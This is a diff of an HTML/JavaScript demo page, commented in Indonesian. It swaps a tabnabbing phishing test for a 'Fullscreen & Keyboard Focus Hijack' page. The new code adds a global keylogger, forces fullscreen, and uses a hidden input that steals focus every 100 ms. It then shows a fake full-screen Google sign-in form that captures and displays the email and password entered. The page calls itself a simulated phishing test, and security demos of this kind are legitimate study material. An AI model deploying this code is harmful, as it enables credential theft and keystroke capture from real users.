@@ -3,8 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Security Verification</title>
-<link rel="icon" type="image/png" href="https://www.google.com/favicon.ico" id="favicon">
+<title>Fullscreen & Keyboard Focus Hijack</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -14,15 +13,17 @@
   button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
   button:hover { background: #1557b0; }
   #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
+  #keylog { margin-top: 20px; padding: 10px; background: #000; color: #0f0; font-family: monospace; font-size: 12px; border-radius: 6px; height: 100px; overflow-y: auto; text-align: left; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Setelah itu, pindah ke tab lain dan kembali ke tab ini.</p>
-  <button id="startBtn">Start Tabnabbing Test</button>
+  <h2>🔒 Fullscreen & Keyboard Focus Hijack</h2>
+  <p>Klik tombol di bawah untuk mencoba fullscreen hijack dan keyboard keylogging.</p>
+  <button id="startBtn">Start Hijack</button>
   <div id="status">[*] Ready...</div>
+  <div id="keylog"></div>
 </div>
 
 <script>
@@ -31,45 +32,102 @@
 
   var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
-  var favicon = document.getElementById('favicon');
-  var isSpoofed = false;
+  var keylogEl = document.getElementById('keylog');
+  var isHijacked = false;
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Tabnabbing] " + msg);
+    console.log("[Fullscreen Hijack] " + msg);
+  }
+
+  function keylog(msg) {
+    keylogEl.innerHTML += "> " + msg + "<br>";
+    console.log("[Keylog] " + msg);
   }
 
   // ============================================
-  // 1. FUNGSI SPOOFING (FAVICON & TITLE)
+  // 1. KEYLOGGER (GLOBAL)
   // ============================================
-  function spoofTab() {
-    if (isSpoofed) return;
-    isSpoofed = true;
+  document.addEventListener('keydown', function(e) {
+    if (!isHijacked) return;
+    var key = e.key || 'Unknown';
+    var code = e.code || 'Unknown';
+    keylog('Key: ' + key + ' | Code: ' + code);
+  });
 
-    // Ganti title menjadi "Sesi Berakhir - Login Ulang"
-    document.title = "Sesi Berakhir - Login Ulang Google";
+  // ============================================
+  // 2. FULLSCREEN HIJACK
+  // ============================================
+  async function requestFullscreen() {
+    try {
+      var elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        await elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) {
+        await elem.webkitRequestFullscreen();
+      } else if (elem.mozRequestFullScreen) {
+        await elem.mozRequestFullScreen();
+      }
+      log("[+] Fullscreen granted!");
+      isHijacked = true;
+    } catch (e) {
+      log("[-] Fullscreen denied: " + e.message);
+    }
+  }
 
-    // Ganti favicon menjadi favicon Google (merah)
-    favicon.href = "https://www.google.com/favicon.ico";
+  // ============================================
+  // 3. KEYBOARD FOCUS HIJACK
+  // ============================================
+  function hijackKeyboardFocus() {
+    // Buat elemen input tersembunyi untuk mencuri fokus
+    var hiddenInput = document.createElement('input');
+    hiddenInput.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+    hiddenInput.id = 'focusHijacker';
+    document.body.appendChild(hiddenInput);
+    
+    // Fokus ke input tersembunyi
+    hiddenInput.focus();
+    
+    // Coba fokus berulang kali untuk mengalahkan upaya user
+    setInterval(function() {
+      if (document.activeElement !== hiddenInput) {
+        hiddenInput.focus();
+      }
+    }, 100);
 
-    // Ganti konten halaman menjadi form login palsu
+    log("[+] Keyboard focus hijacked!");
+  }
+
+  // ============================================
+  // 4. TRIGGER (KLIK)
+  // ============================================
+  btn.addEventListener('click', async function() {
+    log("[*] Starting fullscreen & keyboard hijack...");
+
+    // A. Request Fullscreen
+    await requestFullscreen();
+
+    // B. Hijack Keyboard Focus
+    hijackKeyboardFocus();
+
+    // C. Tampilkan UI palsu (fullscreen)
     document.body.innerHTML = `
-      <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
-        <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
-        <h2 style="color:#333;margin-bottom:10px;">Sesi Berakhir</h2>
-        <p style="color:#666;font-size:14px;margin-bottom:20px;">Silakan login ulang untuk melanjutkan.</p>
-        <input type="email" id="phishEmail" placeholder="Email or phone" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
-        <input type="password" id="phishPass" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
-        <button id="phishLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Login Ulang</button>
-        <div style="margin-top:15px;font-size:11px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
+      <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;z-index:9999;">
+        <div style="font-size:48px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
+        <h1 style="color:#333;font-size:28px;margin-bottom:10px;">Google Security Verification</h1>
+        <p style="color:#666;font-size:16px;margin-bottom:30px;">Please enter your credentials to continue.</p>
+        <input type="email" id="fullEmail" placeholder="Email or phone" style="width:80%;max-width:400px;padding:15px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;" />
+        <input type="password" id="fullPass" placeholder="Password" style="width:80%;max-width:400px;padding:15px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:16px;" />
+        <button id="fullLogin" style="width:80%;max-width:400px;padding:15px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;">Next</button>
+        <div style="margin-top:20px;font-size:12px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
       </div>
     `;
 
     // Event listener untuk menangkap input
-    document.getElementById('phishLogin').addEventListener('click', function() {
-      var email = document.getElementById('phishEmail').value;
-      var password = document.getElementById('phishPass').value;
-
+    document.getElementById('fullLogin').addEventListener('click', function() {
+      var email = document.getElementById('fullEmail').value;
+      var password = document.getElementById('fullPass').value;
+      
       if (!email || !password) {
         alert("Email dan password harus diisi!");
         return;
@@ -77,11 +135,11 @@
 
       // Tampilkan data yang ditangkap
       document.body.innerHTML = `
-        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:monospace;">
-          <h2 style="color:#f00;">Credentials Captured!</h2>
-          <p><strong>Email:</strong> ${email}</p>
-          <p><strong>Password:</strong> ${password}</p>
-          <p style="color:#666;font-size:12px;margin-top:20px;">Redirecting to Google...</p>
+        <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;color:#0f0;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:monospace;z-index:9999;">
+          <h1 style="color:#f00;font-size:28px;">Credentials Captured!</h1>
+          <p style="font-size:18px;"><strong>Email:</strong> ${email}</p>
+          <p style="font-size:18px;"><strong>Password:</strong> ${password}</p>
+          <p style="color:#666;font-size:14px;margin-top:20px;">Redirecting to Google...</p>
         </div>
       `;
 
@@ -91,28 +149,7 @@
       }, 2000);
     });
 
-    log("[+] Tab spoofed! Title & Favicon changed.");
-  }
-
-  // ============================================
-  // 2. DETEKSI PERPINDAHAN TAB (VISIBILITY CHANGE)
-  // ============================================
-  document.addEventListener('visibilitychange', function() {
-    if (document.hidden) {
-      // Saat tab tidak aktif, spoof tab
-      log("[!] Tab hidden. Spoofing tab...");
-      setTimeout(spoofTab, 1000); // Delay 1 detik agar tidak terlalu cepat
-    }
-  });
-
-  // ============================================
-  // 3. TRIGGER (KLIK)
-  // ============================================
-  btn.addEventListener('click', function() {
-    log("[*] Tabnabbing test started. Switch to another tab and come back.");
-    
-    // Buka tab baru (Google) untuk memancing user pindah tab
-    window.open('https://www.google.com', '_blank');
+    log("[+] Fullscreen UI spoofing active!");
   }, { once: true });
 
 })();
